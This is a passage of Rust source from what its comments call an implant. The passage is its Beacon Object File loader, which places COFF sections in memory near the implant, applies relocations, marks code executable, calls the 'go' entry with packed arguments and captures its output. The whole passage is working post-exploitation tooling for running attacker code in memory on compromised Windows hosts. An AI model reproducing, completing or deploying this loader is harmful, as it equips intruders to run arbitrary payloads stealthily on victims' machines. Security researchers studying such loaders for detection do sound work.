    // VirtualFree is the cleanup counterpart of VirtualAlloc — used by the
    // SectionGuard to release every section region when `run` returns. The
    // guard is built eagerly (before any allocation) so that even if a later
    // export resolution fails every region pushed so far is freed.
    let free = match unsafe { virtual_free() } {
        Some(f) => f,
        None => return Response::Err(String::from("VirtualFree unresolved")),
    };

    // RAII owner of every VirtualAlloc'd section region. Its Drop zeroes each
    // region (RX flipped back to RW first) then releases it with
    // VirtualFree(MEM_RELEASE) — this is the leak fix: previously every BOF
    // execution permanently leaked all section allocations and left the RX
    // pages holding relocated .text. The guard owns the regions from the moment
    // each is pushed until the function returns (any path). `bases`/`sizes`
    // still mirror what the guard tracks, for the existing symbol/reloc/entry
    // lookups below.
    let mut guard = SectionGuard {
        sections: Vec::with_capacity(coff.sections.len()),
        free,
        protect,
    };

    // Anchor near the implant image so REL32 calls from BOF .text to the
    // Beacon-API shims (in the implant image) span < 2 GiB. Without this,
    // VirtualAlloc(NULL,...) can place the BOF 100+ TB from the implant and
    // every REL32 call/lea into a shim overflows the 32-bit displacement →
    // the call jumps to garbage → segfault. We probe a hint address derived
    // from a local function's address (a stand-in for the image base), walking
    // downward in 1 MiB steps until VirtualAlloc grants a region.
    let anchor = beacon_api_addr("BeaconPrintf").unwrap_or(0x10000) as usize;

    // 1. Allocate each section as its own RW region; copy raw bytes.
    let mut bases: Vec<u64> = Vec::with_capacity(coff.sections.len());
    let mut sizes: Vec<usize> = Vec::with_capacity(coff.sections.len());
    let mut is_code: Vec<bool> = Vec::with_capacity(coff.sections.len());
    for s in &coff.sections {
        let sz = page((s.virtual_size.max(s.raw.len() as u32)) as usize).max(PAGE_SIZE);
        let base = unsafe { alloc_near(alloc, anchor, sz) };
        if base.is_null() {
            return Response::Err(String::from("VirtualAlloc failed"));
        }
        let addr = base as u64;
        if !s.raw.is_empty() {
            unsafe {
                ptr::copy_nonoverlapping(s.raw.as_ptr(), addr as *mut u8, s.raw.len());
            }
        }
        bases.push(addr);
        sizes.push(sz);
        is_code.push(s.characteristics & SCN_MEM_EXECUTE != 0);
        // Track the region in the guard as NOT-yet-RX; step 4 marks the code
        // sections RX so the Drop knows to flip them back before zeroing.
        guard.sections.push(SectionAlloc {
            base: addr,
            size: sz,
            is_rx: false,
        });
    }

    // 2. Map defined symbols → absolute addresses (section_base + value).
    let mut defined: Vec<(String, u64)> = Vec::with_capacity(coff.symbols.len());
    for sym in &coff.symbols {
        if sym.section_number >= 1 && (sym.section_number as usize) <= bases.len() {
            let addr = bases[(sym.section_number - 1) as usize] + sym.value as u64;
            defined.push((sym.name.clone(), addr));
        }
    }

    // 3. Apply relocations (memory is still RW here).
    let resolver = BofResolver { defined: &defined };
    for (i, s) in coff.sections.iter().enumerate() {
        if s.relocations.is_empty() {
            continue;
        }
        let patched = match apply(s, &coff, bases[i], &resolver) {
            Ok(p) => p,
            Err(e) => {
                let mut m = String::from("bof reloc `");
                m.push_str(&s.name);
                m.push_str("`: ");
                m.push_str(match e {
                    nyx_coff::ApplyError::BadSymbolIndex(_) => "bad symbol index",
                    nyx_coff::ApplyError::Unresolved(_) => "unresolved external",
                    nyx_coff::ApplyError::BadOffset => "bad offset",
                    nyx_coff::ApplyError::UnsupportedReloc(_) => "unsupported reloc type",
                    nyx_coff::ApplyError::RelocOverflow => "reloc displacement out of i32 range",
                });
                return Response::Err(m);
            }
        };
        unsafe {
            ptr::copy_nonoverlapping(patched.as_ptr(), bases[i] as *mut u8, patched.len());
        }
    }

    // 4. Flip code sections to RX (W^X: close the write window). Also record
    //    is_rx in the guard so Drop flips them back to RW before zeroing.
    for i in 0..bases.len() {
        if is_code[i] {
            let mut old: u32 = 0;
            if unsafe {
                protect(
                    bases[i] as *mut c_void,
                    sizes[i],
                    PAGE_EXECUTE_READ,
                    &mut old,
                )
            } == 0
            {
                return Response::Err(String::from("VirtualProtect -> RX failed"));
            }
            guard.sections[i].is_rx = true;
        }
    }

    // 5. Resolve the entry symbol `go`.
    let entry_sym = match coff.symbols.iter().find(|s| s.name == "go") {
        Some(s) => s,
        None => return Response::Err(String::from("BOF entry symbol `go` not found")),
    };
    if entry_sym.section_number < 1 {
        return Response::Err(String::from("BOF entry `go` is external/undefined"));
    }
    let entry_addr = bases[(entry_sym.section_number - 1) as usize] + entry_sym.value as u64;

    // 6. Set up capture + args, call go(), capture output. The SectionGuard is
    //    dropped when `run` returns (here or at any error above), so the section
    //    regions are zeroed + freed AFTER go() has returned — by which point no
    //    Beacon-API shim holds a live pointer into them.
    #[cfg(feature = "selftest")]
    unsafe {
        let n = bases.len().min(4);
        TRACE_NUMS[0] = bases.len() as u64;
        for i in 0..n {
            TRACE_NUMS[1 + i] = bases[i];
        }
        TRACE_NUMS[5] = entry_addr;
        TRACE_NUMS[6] = beacon_api_addr("BeaconPrintf").unwrap_or(0);
        let mut status: u64 = 0;
        let e = entry_addr as *const u8;
        // Fixture layout (bof_print.o): lea disp32 at +0x11, call disp32 at
        // +0x1e. Every raw read is gated on a VirtualQuery readability probe
        // so a broken relocation degrades to status bits instead of an AV.
        if vq_readable(e as usize, 0x30) {
            status |= 1;
            ptr::copy_nonoverlapping(e, TRACE_BYTES.as_mut_ptr(), 16);
            ptr::copy_nonoverlapping(e.add(0x11), TRACE_BYTES.as_mut_ptr().add(16), 4);
            ptr::copy_nonoverlapping(e.add(0x1e), TRACE_BYTES.as_mut_ptr().add(20), 4);
            let disp = (e.add(0x11) as *const i32).read_unaligned() as i64;
            let tgt = (entry_addr + 0x15).wrapping_add(disp as u64);
            TRACE_NUMS[7] = tgt;
            if vq_readable(tgt as usize, 8) {
                status |= 2;
                ptr::copy_nonoverlapping(tgt as *const u8, TRACE_BYTES.as_mut_ptr().add(24), 8);
            }
        }
        // status rides in the high dword of TRACE_NUMS[0]:
        // bit32 = entry 16B readable, bit33 = lea target readable.
        TRACE_NUMS[0] |= status << 32;
    }
    let args_blob = pack_args(args);
    let resp = unsafe {
        reset_capture();
        if !args_blob.is_empty() {
            ARGS_PTR = args_blob.as_ptr();
            ARGS_LEN = args_blob.len();
        }
        let go: extern "C" fn() = core::mem::transmute(entry_addr);
        go();
        let out = captured_output().to_vec();
        Response::BofOutput(out)
    };
    // `guard` drops here: every section region is zeroed (RX flipped back to RW
    // first) then released with VirtualFree(MEM_RELEASE). Best-effort on a
    // missing RtlZeroMemory/VirtualProtect export (diag mark + still free).
    drop(guard);
    resp
}
